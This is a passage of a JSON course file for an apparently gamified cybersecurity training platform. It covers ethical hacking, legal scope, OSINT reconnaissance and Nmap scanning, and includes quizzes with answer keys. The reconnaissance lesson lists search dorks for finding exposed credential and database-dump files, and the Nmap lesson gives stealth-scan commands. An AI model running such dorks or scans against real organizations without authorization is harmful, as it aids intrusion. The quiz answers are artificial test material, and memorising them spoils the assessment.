          "technicalTakeaways": "Adversaries chain phishing, credential dumping, and lateral movement. Rigorous EDR isolation and credential resets halt attacks.",
          "commandsCovered": [
            "Cross-log analysis",
            "EDR isolation"
          ],
          "commonMistakes": "Isolating only the initial workstation while leaving lateral targets compromised on the network.",
          "learningOutcome": "You can correlate a multi-stage enterprise breach across diverse logs, execute containment, and deliver executive post-mortem reports."
        },
        "questions": [
          {
            "id": "q-32-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Defensive Security Capstone?",
            "options": [
              "Correlate a full multi-stage enterprise breach across firewall, syslog, and Windows events",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Correlate a full multi-stage enterprise breach across firewall, syslog, and Windows events is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-32-1",
        "type": "multiple-choice",
        "question": "Based on the evidence briefing, what was the adversary's Initial Access vector into the network?",
        "options": [
          "SQL Injection on the public website",
          "Spear-phishing email containing a link to a malicious executable disguised as an invoice",
          "Physical break-in to the datacenter",
          "BGP route hijacking of the corporate DNS"
        ],
        "correctIndex": 1,
        "hint": "Look at the user email activity.",
        "explanation": "The initial access vector was spear-phishing delivering a masqueraded executable (invoice.pdf.exe)."
      },
      {
        "id": "q-32-2",
        "type": "exact",
        "question": "Which Windows process memory was dumped by the adversary on WS-042 to extract plaintext and hashed domain credentials?",
        "visualSlots": "_ _ _ _ _ . _ _ _",
        "acceptedAnswers": [
          "lsass.exe",
          "lsass"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Local Security Authority Subsystem Service executable.",
        "explanation": "lsass.exe holds cached authentication tokens, Kerberos tickets, and NTLM hashes in memory."
      },
      {
        "id": "q-32-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Defensive Security Capstone?",
        "options": [
          "Correlate a full multi-stage enterprise breach across firewall, syslog, and Windows events",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Correlate a full multi-stage enterprise breach across firewall, syslog, and Windows events is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Breach Scenario: Phase 1 & 2 - Initial Access & Execution",
        "instruction": "Inspect the evidence timeline from initial user click to active C2 beaconing.",
        "hints": [
          "Look at the user email activity."
        ]
      },
      {
        "title": "Task 2: Phase 3 & 4 - Lateral Movement & Containment Execution",
        "instruction": "Review the sequence of lateral movement and execute the containment protocol.",
        "hints": [
          "Local Security Authority Subsystem Service executable."
        ]
      },
      {
        "title": "Task 3: Defensive Security Capstone Review & Transition to Offense",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-33"
  },
  {
    "id": "room-33",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 33,
    "title": "Introduction to Ethical Hacking",
    "description": "Enter the world of authorized security testing: ethical hacking mindsets, testing methodologies, and penetration testing phases.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-32",
    "whyAreYouHere": "Enter the world of authorized security testing: ethical hacking mindsets, testing methodologies, and penetration testing phases.",
    "objectives": [
      "Define ethical hacking and its defensive objectives",
      "Differentiate Black-Box, White-Box, and Gray-Box testing",
      "Master the five phases of penetration testing",
      "Understand certified scopes and ethical responsibilities"
    ],
    "skillsGained": [
      "Ethical Hacking Principles",
      "Black/White/Gray Box",
      "Pentesting Phases",
      "Scoping & Ethics"
    ],
    "toolsAndCommands": [
      "whoami",
      "id",
      "which nmap",
      "which hydra"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Ethical Hacking Mindset & Testing Types",
        "concept": "**Ethical Hacking** (penetration testing) is the authorized simulation of adversary attacks against systems, applications, and networks to identify security vulnerabilities before malicious actors can exploit them. Penetration tests are categorized by the level of information provided to the tester:\n- **Black-Box Testing:** Zero prior knowledge of target architecture. Simulates a blind external adversary. High realism, but may miss deeply embedded internal flaws\n- **White-Box Testing (Crystal-Box):** Full disclosure of network diagrams, application source code, and credentials. Maximizes thoroughness and code auditing efficiency\n- **Gray-Box Testing:** Partial knowledge (e.g. standard user credentials and high-level architecture diagram). Simulates an insider or an attacker who has already breached the perimeter. Most common in commercial engagements.",
        "whyItMatters": "Ethical hackers think like adversaries but act with strict integrity to protect the organization.",
        "examples": [
          "Black-Box: Given only the domain `target.com`",
          "Gray-Box: Given domain and low-privilege employee credentials",
          "White-Box: Full GitHub repository access and database schema"
        ],
        "commands": [
          {
            "cmd": "whoami",
            "desc": "Verify testing shell context"
          }
        ],
        "guidedExercise": "Evaluate the trade-offs between black-box realism and white-box thoroughness.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-33-1",
            "type": "multiple-choice",
            "question": "Which penetration testing methodology provides the tester with full internal knowledge, architectural diagrams, and source code access?",
            "options": [
              "Black-Box Testing",
              "White-Box Testing",
              "Blind Testing",
              "Physical Security Testing"
            ],
            "correctIndex": 1,
            "hint": "Full crystal-clear transparency.",
            "explanation": "White-box testing provides full visibility into internal architecture and source code for comprehensive assessment."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: The Five Phases of Penetration Testing",
        "concept": "Professional penetration tests follow a structured lifecycle:\n1. **Planning & Scoping:** Defining legal authorization, testing windows, IP targets, and rules of engagement\n2. **Reconnaissance & OSINT:** Gathering intelligence (DNS records, employee emails, tech stack) without actively attacking\n3. **Scanning & Enumeration:** Actively probing target IPs for open ports, running services, and version banners\n4. **Vulnerability Assessment & Exploitation:** Discovering weaknesses and validating exploitability in a controlled manner\n5. **Post-Exploitation & Reporting:** Demonstrating business impact (without destructive damage) and writing a detailed remediation report for leadership.",
        "whyItMatters": "Exploitation is only a tiny fraction of the job; comprehensive reporting and defensive guidance are the primary deliverables.",
        "examples": [
          "Phase 1: Legal contract signed",
          "Phase 2: Whois & DNS lookup",
          "Phase 3: Nmap port scan",
          "Phase 4: SQL injection proof-of-concept",
          "Phase 5: Remediation guidance delivered"
        ],
        "commands": [
          {
            "cmd": "echo 'Reconnaissance -> Scanning -> Vulnerability Assessment -> Exploitation -> Reporting'",
            "desc": "Review the 5 pentesting phases"
          }
        ],
        "guidedExercise": "Trace the sequence of penetration testing from scoping to remediation reporting.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-33-2",
            "type": "exact",
            "question": "What is the final and most important phase of a professional penetration test that translates findings into defensive value for the client?",
            "visualSlots": "_ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "reporting",
              "report",
              "remediation reporting"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Documenting findings and fixes.",
            "explanation": "The Reporting phase documents vulnerabilities, business impact, and remediation roadmaps."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Ethical Responsibilities & Review",
        "concept": "An ethical hacker must never exceed authorized scope, never destroy client data, and immediately report critical vulnerabilities (such as active breaches) to the client point of contact.",
        "whyItMatters": "Ethics and legal authorization are the absolute dividing line between security research and criminal activity.",
        "examples": [
          "Immediate Escalation: If you find active ransomware on a client server, notify the emergency contact immediately"
        ],
        "commands": [
          {
            "cmd": "echo 'Ethical Hacking Foundations Mastered'",
            "desc": "Complete Ethical Hacking Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Ethical hacking purpose, Black/White/Gray-Box testing models, the 5 phases of penetration testing, and ethical reporting duties.",
          "technicalTakeaways": "Ethical hackers must have explicit authorization. Gray-box testing balances realism with cost-efficiency. Reporting is the true deliverable.",
          "commandsCovered": [
            "whoami",
            "id"
          ],
          "commonMistakes": "Thinking penetration testing is just running exploit scripts without structured scoping or reporting.",
          "learningOutcome": "You can plan a penetration test, distinguish testing models, and execute the five phases of security testing."
        },
        "questions": [
          {
            "id": "q-33-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Introduction to Ethical Hacking?",
            "options": [
              "Define ethical hacking and its defensive objectives",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Define ethical hacking and its defensive objectives is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-33-1",
        "type": "multiple-choice",
        "question": "Which penetration testing methodology provides the tester with full internal knowledge, architectural diagrams, and source code access?",
        "options": [
          "Black-Box Testing",
          "White-Box Testing",
          "Blind Testing",
          "Physical Security Testing"
        ],
        "correctIndex": 1,
        "hint": "Full crystal-clear transparency.",
        "explanation": "White-box testing provides full visibility into internal architecture and source code for comprehensive assessment."
      },
      {
        "id": "q-33-2",
        "type": "exact",
        "question": "What is the final and most important phase of a professional penetration test that translates findings into defensive value for the client?",
        "visualSlots": "_ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "reporting",
          "report",
          "remediation reporting"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Documenting findings and fixes.",
        "explanation": "The Reporting phase documents vulnerabilities, business impact, and remediation roadmaps."
      },
      {
        "id": "q-33-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Introduction to Ethical Hacking?",
        "options": [
          "Define ethical hacking and its defensive objectives",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Define ethical hacking and its defensive objectives is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Ethical Hacking Mindset & Testing Types",
        "instruction": "Evaluate the trade-offs between black-box realism and white-box thoroughness.",
        "hints": [
          "Full crystal-clear transparency."
        ]
      },
      {
        "title": "Task 2: The Five Phases of Penetration Testing",
        "instruction": "Trace the sequence of penetration testing from scoping to remediation reporting.",
        "hints": [
          "Documenting findings and fixes."
        ]
      },
      {
        "title": "Task 3: Ethical Responsibilities & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-34"
  },
  {
    "id": "room-34",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 34,
    "title": "Rules of Engagement and Legal Boundaries",
    "description": "Master the legal framework of offensive security: CFAA, Computer Misuse Act, Rules of Engagement (RoE), and out-of-scope liabilities.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-33",
    "whyAreYouHere": "Master the legal framework of offensive security: CFAA, Computer Misuse Act, Rules of Engagement (RoE), and out-of-scope liabilities.",
    "objectives": [
      "Explain the Computer Fraud and Abuse Act (CFAA) and international cyber laws",
      "Draft a comprehensive Rules of Engagement (RoE) document",
      "Define in-scope vs out-of-scope targets and third-party cloud boundaries",
      "Establish emergency contact channels and critical finding escalation paths"
    ],
    "skillsGained": [
      "Legal Frameworks (CFAA)",
      "Rules of Engagement (RoE)",
      "In-Scope vs Out-of-Scope",
      "Liability Protection"
    ],
    "toolsAndCommands": [
      "cat",
      "grep -i 'scope'",
      "whois"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Legal Frameworks: CFAA & Computer Misuse Act",
        "concept": "Interacting with computer networks without explicit permission violates major criminal statutes:\n- **Computer Fraud and Abuse Act (CFAA - 18 U.S.C. \u00a7 1030):** United States federal law that criminalizes intentionally accessing a protected computer without authorization or exceeding authorized access. Penalties include heavy fines and federal prison sentences\n- **Computer Misuse Act (UK 1990):** Criminalizes unauthorized access to computer material and unauthorized acts with intent to impair computer operation.\n**The Defense:** Explicit, written legal authorization signed by an authorized corporate officer with ownership over the target infrastructure. A verbal 'go ahead' has zero legal standing.",
        "whyItMatters": "Testing a friend's website without signed authorization is a felony under the CFAA, regardless of friendly intentions.",
        "examples": [
          "Unauthorized Access: Connecting to a private database without permission",
          "Exceeding Authorized Access: An employee authorized to read billing records downloading executive salary databases"
        ],
        "commands": [
          {
            "cmd": "echo 'Authorization must be explicit, written, and signed by authorized leadership'",
            "desc": "Review core legal principle"
          }
        ],
        "guidedExercise": "Understand the legal mechanisms that protect certified security researchers.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-34-1",
            "type": "exact",
            "question": "What major United States federal statute criminalizes unauthorized access to protected computer systems?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "CFAA",
              "Computer Fraud and Abuse Act"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym starting with C.",
            "explanation": "The CFAA (Computer Fraud and Abuse Act) is the primary federal cybercrime law in the United States."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: The Rules of Engagement (RoE) Document",
        "concept": "Before any testing begins, both parties execute the **Rules of Engagement (RoE)** contract. Critical components include:\n- **Explicit Scope:** Exact IP ranges, CIDR blocks, domain names, and APIs permitted to be tested\n- **Out-of-Scope Targets:** Third-party SaaS providers (e.g. AWS/Azure infrastructure, payment processors like Stripe), production OT systems, and critical medical devices that must NEVER be touched\n- **Authorized Testing Hours:** Schedule (e.g. weekends 22:00-06:00 UTC to minimize business disruption)\n- **Restricted Techniques:** Explicit bans on Denial of Service (DoS/DDoS), physical social engineering, or destructive disk commands\n- **Emergency Contacts:** 24/7 phone numbers for both teams in case an unexpected server crash or true breach is uncovered.",
        "whyItMatters": "Testing an IP address not listed in the RoE document is illegal, even if it belongs to the same parent company.",
        "examples": [
          "In-Scope: `198.51.100.0/24`, `app.target.com`",
          "Out-of-Scope: `payroll.target.com`, third-party cloud load balancers",
          "Emergency Protocol: Stop testing and call CISO immediately upon discovering active data breach"
        ],
        "commands": [
          {
            "cmd": "echo 'Target Scope: 10.10.10.0/24 | Excluded: 10.10.10.1 (Gateway)'",
            "desc": "Reference sample scope specification"
          }
        ],
        "guidedExercise": "Inspect how scope definitions prevent unintended collateral damage.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-34-2",
            "type": "multiple-choice",
            "question": "What must an ethical penetration tester do immediately if they accidentally discover an active, real-world adversary breach on a client network during testing?",
            "options": [
              "Ignore it and continue testing",
              "Immediately halt relevant testing and notify the designated emergency client contacts listed in the Rules of Engagement",
              "Post the breach details on social media",
              "Delete all system logs to hide the intrusion"
            ],
            "correctIndex": 1,
            "hint": "Notify emergency contacts immediately.",
            "explanation": "Active real-world breaches must be escalated immediately to client leadership via established emergency channels."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Rules of Engagement Review",
        "concept": "Always verify scope before firing any scan. Cloud providers (AWS, Azure, GCP) allow penetration testing against user-owned instances but strictly prohibit attacking shared hypervisors or cloud control planes.",
        "whyItMatters": "Safe testing protects the client's business continuity and the consultant's legal safety.",
        "examples": [
          "Cloud Testing Policy: Follow AWS/Azure customer penetration testing rules"
        ],
        "commands": [
          {
            "cmd": "echo 'Legal Boundaries & Rules of Engagement Mastered'",
            "desc": "Complete RoE Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "CFAA and international cyber laws, explicit written authorization, Rules of Engagement (RoE) components, and in-scope vs out-of-scope boundaries.",
          "technicalTakeaways": "Never test without written authorization. Stay strictly within the IP scope; third-party cloud infrastructure is out of scope.",
          "commandsCovered": [
            "Scope verification"
          ],
          "commonMistakes": "Assuming permission to test 'target.com' includes permission to attack third-party payment gateways hosted under subdomains.",
          "learningOutcome": "You can draft a Rules of Engagement agreement, define scope boundaries, and operate within legal frameworks."
        },
        "questions": [
          {
            "id": "q-34-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Rules of Engagement and Legal Boundaries?",
            "options": [
              "Explain the Computer Fraud and Abuse Act (CFAA) and international cyber laws",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Explain the Computer Fraud and Abuse Act (CFAA) and international cyber laws is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-34-1",
        "type": "exact",
        "question": "What major United States federal statute criminalizes unauthorized access to protected computer systems?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "CFAA",
          "Computer Fraud and Abuse Act"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym starting with C.",
        "explanation": "The CFAA (Computer Fraud and Abuse Act) is the primary federal cybercrime law in the United States."
      },
      {
        "id": "q-34-2",
        "type": "multiple-choice",
        "question": "What must an ethical penetration tester do immediately if they accidentally discover an active, real-world adversary breach on a client network during testing?",
        "options": [
          "Ignore it and continue testing",
          "Immediately halt relevant testing and notify the designated emergency client contacts listed in the Rules of Engagement",
          "Post the breach details on social media",
          "Delete all system logs to hide the intrusion"
        ],
        "correctIndex": 1,
        "hint": "Notify emergency contacts immediately.",
        "explanation": "Active real-world breaches must be escalated immediately to client leadership via established emergency channels."
      },
      {
        "id": "q-34-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Rules of Engagement and Legal Boundaries?",
        "options": [
          "Explain the Computer Fraud and Abuse Act (CFAA) and international cyber laws",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Explain the Computer Fraud and Abuse Act (CFAA) and international cyber laws is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Legal Frameworks: CFAA & Computer Misuse Act",
        "instruction": "Understand the legal mechanisms that protect certified security researchers.",
        "hints": [
          "Four-letter acronym starting with C."
        ]
      },
      {
        "title": "Task 2: The Rules of Engagement (RoE) Document",
        "instruction": "Inspect how scope definitions prevent unintended collateral damage.",
        "hints": [
          "Notify emergency contacts immediately."
        ]
      },
      {
        "title": "Task 3: Rules of Engagement Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-35"
  },
  {
    "id": "room-35",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 35,
    "title": "Reconnaissance Fundamentals",
    "description": "Master open-source intelligence (OSINT): passive footprinting, WHOIS registration audits, DNS enumeration, and search engine dorking.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-34",
    "whyAreYouHere": "Master open-source intelligence (OSINT): passive footprinting, WHOIS registration audits, DNS enumeration, and search engine dorking.",
    "objectives": [
      "Differentiate passive reconnaissance (zero touch) from active reconnaissance",
      "Extract ownership and routing data from WHOIS databases",
      "Query DNS record types (A, AAAA, MX, NS, TXT, CNAME) for infrastructure mapping",
      "Perform advanced search engine dorking to discover exposed documents and credentials"
    ],
    "skillsGained": [
      "Passive OSINT",
      "WHOIS Auditing",
      "DNS Record Enumeration",
      "Google Dorking"
    ],
    "toolsAndCommands": [
      "whois",
      "dig",
      "host",
      "nslookup",
      "curl -s"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Passive vs Active Reconnaissance",
        "concept": "Reconnaissance is the first operational phase of an attack:\n- **Passive Reconnaissance:** Gathering intelligence without directly interacting with or sending packets to the target's servers. Exploits publicly available archives, search engines, WHOIS databases, Certificate Transparency logs, and job postings. Leaves ZERO footprint on the target's intrusion detection systems\n- **Active Reconnaissance:** Directly sending packets to the target's network infrastructure (port scanning, web crawling, banner grabbing). Generates log entries and can be detected by firewalls and SIEMs.\nAlways maximize passive intelligence before touching the target actively.",
        "whyItMatters": "Passive intelligence often reveals employee email addresses, technology stacks, and staging servers without firing a single alert.",
        "examples": [
          "Passive: Searching crt.sh for SSL certificates revealing secret subdomains",
          "Active: Sending Nmap SYN packets to target port 443"
        ],
        "commands": [
          {
            "cmd": "whois 8.8.8.8 | grep -E '(OrgName|NetRange)'",
            "desc": "Query public ARIN registry for IP block ownership passively"
          }
        ],
        "guidedExercise": "Perform passive WHOIS queries to inspect network range ownership.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-35-1",
            "type": "multiple-choice",
            "question": "What is the distinguishing characteristic of passive reconnaissance?",
            "options": [
              "It sends intensive exploit payloads to the target",
              "It gathers intelligence from public sources without sending direct network packets to the target systems",
              "It requires physical entry into the building",
              "It only works on Windows computers"
            ],
            "correctIndex": 1,
            "hint": "Zero direct packets sent to the target.",
            "explanation": "Passive reconnaissance gathers data from third-party public repositories without sending traffic to the target."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: DNS Record Enumeration (dig / host)",
        "concept": "The Domain Name System (DNS) is an intelligence treasure trove. Essential record types:\n- **A / AAAA:** Maps hostname to IPv4 / IPv6 address\n- **MX (Mail Exchange):** Points to email servers (reveals email security gateways like Proofpoint or Mimecast)\n- **NS (Name Server):** Authoritative DNS servers for the domain\n- **TXT:** Often contains verification strings (Google Site Verification, SPF records listing authorized mail-sending IP ranges, DKIM/DMARC)\n- **CNAME:** Canonical name aliases (reveals underlying cloud services like AWS S3 or Cloudflare).",
        "whyItMatters": "TXT SPF records frequently disclose an organization's entire internal and external IP address blocks.",
        "examples": [
          "dig target.com A: Find IP address",
          "dig target.com MX: Discover email architecture",
          "dig target.com TXT: Extract SPF record `v=spf1 ip4:198.51.100.0/24 -all`"
        ],
        "commands": [
          {
            "cmd": "dig +short google.com A",
            "desc": "Resolve A record"
          },
          {
            "cmd": "dig +short google.com MX",
            "desc": "Resolve mail exchange records"
          }
        ],
        "guidedExercise": "Query DNS records to map target infrastructure components.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-35-2",
            "type": "exact",
            "question": "Which DNS record type specifies the mail servers responsible for accepting incoming email for a domain?",
            "visualSlots": "_ _",
            "acceptedAnswers": [
              "MX",
              "Mail Exchange"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Two-letter acronym for Mail Exchange.",
            "explanation": "MX records specify the designated mail exchange servers for a domain."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Certificate Transparency & Google Dorking Review",
        "concept": "Modern HTTPS relies on **Certificate Transparency (CT)** logs\u2014public, append-only ledgers of all SSL/TLS certificates issued by CAs. Querying `https://crt.sh/?q=%.target.com` instantly reveals hidden subdomains (e.g. `dev-api.target.com`, `vpn-staging.target.com`).\n**Google Dorking** uses advanced search operators to find exposed data:\n- `site:target.com filetype:pdf confidential`: Locate leaked internal documents\n- `site:target.com inurl:admin`: Find administrative login portals\n- `site:target.com ext:env DB_PASSWORD`: Discover exposed environment files.",
        "whyItMatters": "Certificate Transparency logs expose new development subdomains minutes after certificates are requested.",
        "examples": [
          "crt.sh: Discovers unlinked staging servers",
          "Google Dork: `site:target.com filetype:sql 'dump'`"
        ],
        "commands": [
          {
            "cmd": "echo 'Reconnaissance & OSINT Mastered'",
            "desc": "Complete Recon Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Passive vs active reconnaissance, WHOIS ownership, DNS record types (A, MX, TXT, CNAME), Certificate Transparency (crt.sh), and Google Dorking.",
          "technicalTakeaways": "Passive reconnaissance leaves zero log footprint. DNS TXT records reveal SPF IP blocks; Certificate Transparency exposes secret subdomains.",
          "commandsCovered": [
            "whois",
            "dig",
            "host"
          ],
          "commonMistakes": "Launching active Nmap scans before exhausting passive OSINT opportunities.",
          "learningOutcome": "You can execute passive reconnaissance, enumerate DNS records, query Certificate Transparency logs, and apply Google dorks."
        },
        "questions": [
          {
            "id": "q-35-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Reconnaissance Fundamentals?",
            "options": [
              "Differentiate passive reconnaissance (zero touch) from active reconnaissance",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate passive reconnaissance (zero touch) from active reconnaissance is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-35-1",
        "type": "multiple-choice",
        "question": "What is the distinguishing characteristic of passive reconnaissance?",
        "options": [
          "It sends intensive exploit payloads to the target",
          "It gathers intelligence from public sources without sending direct network packets to the target systems",
          "It requires physical entry into the building",
          "It only works on Windows computers"
        ],
        "correctIndex": 1,
        "hint": "Zero direct packets sent to the target.",
        "explanation": "Passive reconnaissance gathers data from third-party public repositories without sending traffic to the target."
      },
      {
        "id": "q-35-2",
        "type": "exact",
        "question": "Which DNS record type specifies the mail servers responsible for accepting incoming email for a domain?",
        "visualSlots": "_ _",
        "acceptedAnswers": [
          "MX",
          "Mail Exchange"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Two-letter acronym for Mail Exchange.",
        "explanation": "MX records specify the designated mail exchange servers for a domain."
      },
      {
        "id": "q-35-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Reconnaissance Fundamentals?",
        "options": [
          "Differentiate passive reconnaissance (zero touch) from active reconnaissance",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate passive reconnaissance (zero touch) from active reconnaissance is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Passive vs Active Reconnaissance",
        "instruction": "Perform passive WHOIS queries to inspect network range ownership.",
        "hints": [
          "Zero direct packets sent to the target."
        ]
      },
      {
        "title": "Task 2: DNS Record Enumeration (dig / host)",
        "instruction": "Query DNS records to map target infrastructure components.",
        "hints": [
          "Two-letter acronym for Mail Exchange."
        ]
      },
      {
        "title": "Task 3: Certificate Transparency & Google Dorking Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-36"
  },
  {
    "id": "room-36",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 36,
    "title": "Network Enumeration",
    "description": "Master active network mapping with Nmap: ping sweeps, TCP SYN stealth scans, full connect scans, UDP scanning, and port timing templates.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-35",
    "whyAreYouHere": "Master active network mapping with Nmap: ping sweeps, TCP SYN stealth scans, full connect scans, UDP scanning, and port timing templates.",
    "objectives": [
      "Execute ICMP ping sweeps to discover live network hosts",
      "Differentiate TCP SYN Stealth Scans (-sS) from Full Connect Scans (-sT)",
      "Analyze UDP port scanning mechanics and ICMP Port Unreachable responses",
      "Optimize Nmap timing templates (-T0 through -T5) and output formats"
    ],
    "skillsGained": [
      "Nmap Scanning",
      "SYN Stealth Scans",
      "UDP Scanning",
      "Timing Templates"
    ],
    "toolsAndCommands": [
      "nmap -sn",
      "nmap -sS",
      "nmap -sT",
      "nmap -sU",
      "nmap -p-"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Host Discovery (Ping Sweeps) & TCP SYN Stealth Scanning",
        "concept": "Once authorized, active reconnaissance begins with **Nmap** (Network Mapper):\n- **Host Discovery (Ping Sweep - `-sn`):** Probes a subnet to find live hosts without scanning individual ports (uses ICMP Echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp)\n- **TCP SYN Stealth Scan (`-sS`):** The default and most popular scan. Nmap sends a SYN packet to each target port:\n  - If the port is **OPEN**, the server replies with `SYN-ACK`. Nmap immediately sends an `RST` (reset) packet to tear down the connection before the 3-way handshake completes! This avoids creating an established application session, evading legacy application logging\n  - If the port is **CLOSED**, the server replies with `RST`\n  - If the port is **FILTERED**, a firewall silently drops the packet or returns an ICMP Administratively Prohibited message\n*Note:* Running `-sS` requires raw socket access (root/sudo permissions).\n- **TCP Connect Scan (`-sT`):** Used when unprivileged. Completes the full 3-way handshake (SYN, SYN-ACK, ACK, RST). Slower and logged by target applications.",
        "whyItMatters": "SYN stealth scans tear down connections with RST before the target application can log a complete session.",
        "examples": [
          "sudo nmap -sS 192.168.1.50: Half-open stealth scan",
          "nmap -sn 192.168.1.0/24: Discover all live IPs on subnet",
          "nmap -p 1-1000 10.10.10.5: Scan well-known ports"
        ],
        "commands": [
          {
